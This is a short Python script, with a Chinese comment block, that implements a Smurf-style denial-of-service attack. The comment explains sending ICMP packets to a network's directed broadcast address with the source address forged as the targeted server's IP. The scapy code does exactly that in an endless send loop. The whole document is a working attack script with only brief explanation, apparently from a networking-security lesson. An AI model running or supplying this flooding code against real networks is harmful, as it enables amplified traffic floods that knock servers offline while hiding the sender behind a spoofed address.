'''
制造出这样一个ICMP请求的攻击包来，这个包的目的地址为209.165.200.255，是针对209.165.200.0这个网段的广播地址，我们把针对某个网段的广播地址叫做直接广播,
而这个攻击包的源地址不能写自己哦！要写被攻击服务器的IP地址！
'''
from scapy.all import *
eth=Ether()
ip=IP()
ip.src="server_host"
ip.dst="1.1.1.255"
icmp=ICMP()
m=1
while True:
	packet=eth/ip/icmp
	send(packet)
	m+=1
	print(m)